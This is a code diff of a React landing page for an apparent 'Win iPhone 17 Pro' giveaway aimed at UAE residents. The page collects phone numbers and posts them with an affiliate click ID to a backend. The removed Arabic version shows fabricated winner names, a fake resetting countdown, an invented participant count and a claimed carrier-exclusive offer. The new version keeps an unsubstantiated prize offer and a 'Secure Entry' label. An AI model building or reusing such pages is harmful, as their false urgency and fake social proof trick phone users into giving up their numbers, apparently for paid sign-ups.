@@ -1,99 +1,70 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect } from "react";
 
 export default function Home() {
 
-  const [clickId, setClickId] = useState('');
-  const [msisdn, setMsisdn] = useState('');
-  const [step, setStep] = useState(1);
-  const [message, setMessage] = useState('');
+  const [msisdn, setMsisdn] = useState("");
+  const [clickId, setClickId] = useState("");
   const [loading, setLoading] = useState(false);
-  const [winnerIndex, setWinnerIndex] = useState(0);
-  const [countdown, setCountdown] = useState(179);
-
-  const winners = [
-    'أحمد من دبي فاز قبل دقيقة واحدة',
-    'محمد من أبوظبي حصل على iPhone 17',
-    'سارة من الشارقة انضمت الآن',
-    'فاطمة من العين ربحت الجائزة الكبرى',
-    'علي من عجمان تم تأكيد اشتراكه'
-  ];
+  const [step, setStep] = useState(1);
 
   useEffect(() => {
 
-    const params = new URLSearchParams(window.location.search);
+    const params =
+      new URLSearchParams(window.location.search);
 
-    if (params.get('cid')) {
-      setClickId(params.get('cid'));
+    if (params.get("cid")) {
+      setClickId(params.get("cid"));
     }
-
-    const winnerInterval = setInterval(() => {
-      setWinnerIndex(prev =>
-        (prev + 1) % winners.length
-      );
-    }, 3000);
-
-    const countdownInterval = setInterval(() => {
-      setCountdown(prev => {
-        if (prev <= 0) return 179;
-        return prev - 1;
-      });
-    }, 1000);
-
-    return () => {
-      clearInterval(winnerInterval);
-      clearInterval(countdownInterval);
-    };
 
   }, []);
 
-  async function handleSubmit() {
+  async function submitNumber() {
 
     if (!msisdn) {
-      setMessage('يرجى إدخال رقم الهاتف');
       return;
     }
 
     setLoading(true);
-    setMessage('');
 
     let cleanMsisdn = msisdn.trim();
 
-    if (cleanMsisdn.startsWith('0')) {
-      cleanMsisdn = cleanMsisdn.substring(1);
+    if (cleanMsisdn.startsWith("0")) {
+      cleanMsisdn =
+        cleanMsisdn.substring(1);
     }
 
-    if (!cleanMsisdn.startsWith('971')) {
-      cleanMsisdn = '971' + cleanMsisdn;
+    if (!cleanMsisdn.startsWith("971")) {
+      cleanMsisdn =
+        "971" + cleanMsisdn;
     }
 
     try {
 
-      const response = await fetch('/api/request', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          msisdn: cleanMsisdn,
-          click_id: clickId
-        })
-      });
+      const response =
+        await fetch("/api/request", {
+
+          method: "POST",
+
+          headers: {
+            "Content-Type": "application/json"
+          },
+
+          body: JSON.stringify({
+            msisdn: cleanMsisdn,
+            click_id: clickId
+          })
+
+        });
 
       const data = await response.json();
 
       if (data.success) {
-
         setStep(2);
-
-      } else {
-
-        setMessage('❌ هذا الرقم غير مؤهل حالياً');
-
       }
 
     } catch (err) {
 
-      setMessage('❌ حدث خطأ، حاول مرة أخرى');
+      console.log(err);
 
     }
 
@@ -101,124 +72,84 @@ export default function Home() {
 
   }
 
-  const minutes = Math.floor(countdown / 60);
-  const seconds = countdown % 60;
-
   return (
 
-    <div style={styles.body} dir="rtl">
+    <div style={styles.page}>
 
-      <div style={styles.overlay}></div>
+      <div style={styles.card}>
 
-      <div style={styles.container}>
-
-        <div style={styles.liveBar}>
-          🔥 {winners[winnerIndex]}
+        <div style={styles.topBadge}>
+          UAE Exclusive Giveaway
         </div>
 
-        <div style={styles.card}>
+        <img
+          src="https://i.ibb.co/B5tGx9x2/iphone-16.png"
+          style={styles.phone}
+        />
 
-          <div style={styles.badge}>
-            عرض حصري لمشتركي اتصالات
+        <h1 style={styles.title}>
+          Win iPhone 17 Pro
+        </h1>
+
+        <p style={styles.subtitle}>
+          Enter your mobile number for a chance
+          to win the newest iPhone.
+        </p>
+
+        {step === 1 && (
+
+          <>
+
+            <input
+              type="tel"
+              placeholder="50xxxxxxx"
+              value={msisdn}
+              onChange={(e) =>
+                setMsisdn(
+                  e.target.value.replace(/\\D/g, "")
+                )
+              }
+              style={styles.input}
+            />
+
+            <button
+              style={styles.button}
+              onClick={submitNumber}
+            >
+
+              {loading
+                ? "Processing..."
+                : "ENTER NOW"}
+
+            </button>
+
+            <div style={styles.bottomText}>
+              🔒 Secure Entry • UAE Residents Only
+            </div>
+
+          </>
+
+        )}
+
+        {step === 2 && (
+
+          <div style={styles.successBox}>
+
+            <div style={styles.successIcon}>
+              ✓
+            </div>
+
+            <div style={styles.successTitle}>
+              Entry Submitted
+            </div>
+
+            <div style={styles.successText}>
+              Your participation has been confirmed.
+            </div>
+
           </div>
 
-          <img
-            src="https://images.unsplash.com/photo-1695048133142-1a20484d2569?q=80&w=1200&auto=format&fit=crop"
-            style={styles.phoneImage}
-          />
-
-          <h1 style={styles.title}>
-            اربح iPhone 17 Pro Max
-          </h1>
-
-          <p style={styles.subtitle}>
-            🎁 السحب السنوي الأكبر في الإمارات
-          </p>
-
-          <div style={styles.timerBox}>
-            ⏰ ينتهي العرض خلال
-            <span style={styles.timer}>
-              {minutes}:{seconds < 10 ? '0' + seconds : seconds}
-            </span>
-          </div>
-
-          <div style={styles.steps}>
-
-            <div style={styles.stepItem}>
-              ✅ أدخل رقم هاتفك
-            </div>
-
-            <div style={styles.stepItem}>
-              ✅ تأكيد الاشتراك
-            </div>
-
-            <div style={styles.stepItem}>
-              ✅ دخول السحب فوراً
-            </div>
-
-          </div>
-
-          {step === 1 && (
-
-            <>
-
-              <input
-                type="tel"
-                placeholder="5xxxxxxxx"
-                value={msisdn}
-                onChange={(e) =>
-                  setMsisdn(
-                    e.target.value.replace(/\D/g, '')
-                  )
-                }
-                style={styles.input}
-              />
-
-              <button
-                style={styles.button}
-                onClick={handleSubmit}
-              >
-                {loading
-                  ? 'جاري التحقق...'
-                  : '🎁 شارك الآن'}
-              </button>
-
-            </>
-
-          )}
-
-          {step === 2 && (
-
-            <div style={styles.successBox}>
-
-              <div style={styles.successIcon}>
-                ✅
-              </div>
-
-              <div style={styles.successTitle}>
-                تم تسجيلك بنجاح!
-              </div>
-
-              <div style={styles.successText}>
-                لقد تم إدخالك في السحب على
-                iPhone 17 Pro Max
-              </div>
-
-            </div>
-
-          )}
-
-          {message && (
-            <div style={styles.message}>
-              {message}
-            </div>
-          )}
-
-          <div style={styles.bottomUsers}>
-            👥 أكثر من 18,492 مستخدم شاركوا اليوم
-          </div>
-
-        </div>
+        )}
 
       </div>
 
@@ -230,309 +161,203 @@ export default function Home() {
 
 const styles = {
 
-  body: {
+  page: {
 
-    minHeight: '100vh',
-
-    backgroundImage:
-      'url(https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=1600&auto=format&fit=crop)',
-
-    backgroundSize: 'cover',
-
-    backgroundPosition: 'center',
-
-    display: 'flex',
-
-    justifyContent: 'center',
-
-    alignItems: 'center',
-
-    padding: '20px',
-
-    position: 'relative',
-
-    overflow: 'hidden'
-
-  },
-
-  overlay: {
-
-    position: 'absolute',
-
-    top: 0,
-
-    left: 0,
-
-    width: '100%',
-
-    height: '100%',
+    minHeight: "100vh",
 
     background:
-      'linear-gradient(to bottom, rgba(0,0,0,0.75), rgba(0,0,0,0.92))'
+      "linear-gradient(to bottom,#0f172a,#020617)",
 
-  },
+    display: "flex",
 
-  container: {
+    justifyContent: "center",
 
-    width: '100%',
+    alignItems: "center",
 
-    maxWidth: '470px',
-
-    position: 'relative',
-
-    zIndex: 2
-
-  },
-
-  liveBar: {
-
-    background: '#16a34a',
-
-    padding: '12px',
-
-    borderRadius: '12px',
-
-    marginBottom: '15px',
-
-    textAlign: 'center',
-
-    fontWeight: 'bold',
-
-    color: 'white',
-
-    animation: 'pulse 1s infinite'
+    padding: "20px"
 
   },
 
   card: {
 
-    background:
-      'linear-gradient(180deg,#171717,#0f0f0f)',
+    width: "100%",
 
-    borderRadius: '26px',
+    maxWidth: "420px",
 
-    padding: '30px 25px',
+    background: "#111827",
 
-    border: '1px solid rgba(255,255,255,0.1)',
+    borderRadius: "28px",
 
-    backdropFilter: 'blur(10px)',
+    padding: "35px 28px",
+
+    textAlign: "center",
+
+    border:
+      "1px solid rgba(255,255,255,0.08)",
 
     boxShadow:
-      '0 20px 50px rgba(0,0,0,0.5)',
-
-    textAlign: 'center',
-
-    color: 'white'
+      "0 20px 60px rgba(0,0,0,0.4)"
 
   },
 
-  badge: {
+  topBadge: {
 
-    background: '#facc15',
+    display: "inline-block",
 
-    color: '#000',
+    background: "#2563eb",
 
-    fontWeight: 'bold',
+    color: "white",
 
-    display: 'inline-block',
+    padding: "8px 16px",
 
-    padding: '8px 16px',
+    borderRadius: "999px",
 
-    borderRadius: '999px',
+    fontSize: "13px",
 
-    marginBottom: '18px',
+    fontWeight: "bold",
 
-    fontSize: '14px'
+    marginBottom: "22px"
 
   },
 
-  phoneImage: {
+  phone: {
 
-    width: '210px',
+    width: "220px",
 
-    marginBottom: '20px',
-
-    filter:
-      'drop-shadow(0 10px 25px rgba(255,215,0,0.3))'
+    marginBottom: "20px"
 
   },
 
   title: {
 
-    fontSize: '34px',
+    color: "white",
 
-    fontWeight: 'bold',
+    fontSize: "34px",
 
-    color: '#facc15',
+    fontWeight: "bold",
 
-    marginBottom: '12px'
+    marginBottom: "12px"
 
   },
 
   subtitle: {
 
-    color: '#d4d4d4',
+    color: "#94a3b8",
 
-    marginBottom: '22px',
+    fontSize: "16px",
 
-    fontSize: '18px'
+    lineHeight: "1.6",
 
-  },
-
-  timerBox: {
-
-    background: '#991b1b',
-
-    borderRadius: '14px',
-
-    padding: '14px',
-
-    marginBottom: '22px',
-
-    fontWeight: 'bold',
-
-    fontSize: '17px'
-
-  },
-
-  timer: {
-
-    display: 'block',
-
-    marginTop: '8px',
-
-    fontSize: '30px',
-
-    color: '#facc15'
-
-  },
-
-  steps: {
-
-    marginBottom: '22px'
-
-  },
-
-  stepItem: {
-
-    background: '#1f2937',
-
-    padding: '12px',
-
-    borderRadius: '12px',
-
-    marginBottom: '10px',
-
-    fontSize: '15px'
+    marginBottom: "28px"
 
   },
 
   input: {
 
-    width: '100%',
+    width: "100%",
 
-    height: '58px',
+    height: "58px",
 
-    borderRadius: '16px',
+    borderRadius: "16px",
 
-    border: '2px solid #333',
+    border: "1px solid #334155",
 
-    background: '#111827',
+    background: "#0f172a",
 
-    color: 'white',
+    color: "white",
 
-    padding: '0 18px',
+    padding: "0 18px",
 
-    fontSize: '20px',
+    fontSize: "18px",
 
-    marginBottom: '16px'
+    marginBottom: "16px",
+
+    outline: "none"
 
   },
 
   button: {
 
-    width: '100%',
+    width: "100%",
 
-    height: '60px',
+    height: "58px",
 
-    borderRadius: '16px',
+    borderRadius: "16px",
 
-    border: 'none',
+    border: "none",
 
     background:
-      'linear-gradient(90deg,#facc15,#eab308)',
+      "linear-gradient(90deg,#2563eb,#3b82f6)",
 
-    color: '#000',
+    color: "white",
 
-    fontSize: '22px',
+    fontSize: "18px",
 
-    fontWeight: 'bold',
+    fontWeight: "bold",
 
-    cursor: 'pointer',
+    cursor: "pointer",
 
-    boxShadow:
-      '0 10px 25px rgba(250,204,21,0.35)',
+    marginBottom: "18px"
 
-    transition: '0.2s'
+  },
+
+  bottomText: {
+
+    color: "#64748b",
+
+    fontSize: "13px"
 
   },
 
   successBox: {
 
-    background: '#052e16',
-
-    padding: '25px',
-
-    borderRadius: '18px'
+    padding: "20px"
 
   },
 
   successIcon: {
 
-    fontSize: '55px',
+    width: "75px",
 
-    marginBottom: '10px'
+    height: "75px",
+
+    borderRadius: "999px",
+
+    background: "#16a34a",
+
+    color: "white",
+
+    fontSize: "40px",
+
+    display: "flex",
+
+    justifyContent: "center",
+
+    alignItems: "center",
+
+    margin: "0 auto 18px auto"
 
   },
 
   successTitle: {
 
-    fontSize: '28px',
+    color: "white",
 
-    fontWeight: 'bold',
+    fontSize: "28px",
 
-    marginBottom: '12px',
+    fontWeight: "bold",
 
-    color: '#4ade80'
+    marginBottom: "12px"
 
   },
 
   successText: {
 
-    color: '#d4d4d4',
+    color: "#94a3b8",
 
-    lineHeight: '1.6'
-
-  },
-
-  message: {
-
-    marginTop: '18px',
-
-    color: '#f87171',
-
-    fontWeight: 'bold'
-
-  },
-
-  bottomUsers: {
-
-    marginTop: '25px',
-
-    color: '#9ca3af',
-
-    fontSize: '14px'
+    fontSize: "15px"
 
   }
 
 };
+Vercel 会自动更新。
